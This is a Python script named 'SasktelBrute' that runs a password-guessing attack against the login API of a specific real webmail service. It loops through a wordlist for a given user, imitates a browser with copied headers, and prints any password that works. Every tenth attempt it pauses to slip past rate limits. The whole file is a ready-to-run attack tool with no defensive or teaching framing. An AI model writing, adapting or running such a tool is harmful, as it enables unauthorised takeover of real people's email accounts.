import requests
import argparse
import time

def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='SasktelBrute',
        description='Bruteforce Sasktel Webmail',
        epilog='Use responsibly and ethically.')

    parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist")
    parser.add_argument('-u', '--user', type=str, required=True, help="Full username including @sasktel.net")
    args = parser.parse_args()

    with open(args.wordlist, encoding='latin-1') as file:
        passwords = file.read().splitlines()

    user = args.user

    return user, passwords

def attack(user, password):
    url = 'https://webmail.sasktel.net/api/bf/login/'

    headers = {
        'Host': 'webmail.sasktel.net',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3;',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://webmail.sasktel.net/',
        'Content-Type': 'application/json',
        'ADRUM': 'isAjax:true',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }

    data = {
        "SnapInfo": {
            "SnapEmailField": None,
            "SnapPassField": None,
            "SnapUrl": None,
            "SnapOn": "NO",
            "SnapShortEmailOn": None,
            "SnapRemoteAuth": "YES"
        },
        "user": user,
        "password": password
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"RESPONSE: {response.text}")
        if response.status_code == 200:
            print(f"PASSWORD FOUND: {password}")
            return True
    except requests.RequestException as e:
        print(f"Error during request: {e}")
        return False

    return False

if __name__ == '__main__':
    user, passwords = parse_arguments()

    print("Starting the attack...")

    attempt_count = 0  # Initialize the counter

    for password in passwords:
        print(f"Trying password: {password}")

        if attack(user, password):
            break

        time.sleep(2)
        attempt_count += 1  # Increment the counter

        # If 10 attempts have been made, wait for 30 seconds and reset the counter
        if attempt_count == 10:
            print("Waiting for 30 seconds...")
            time.sleep(30)
            attempt_count = 0

    print("Attack finished.")
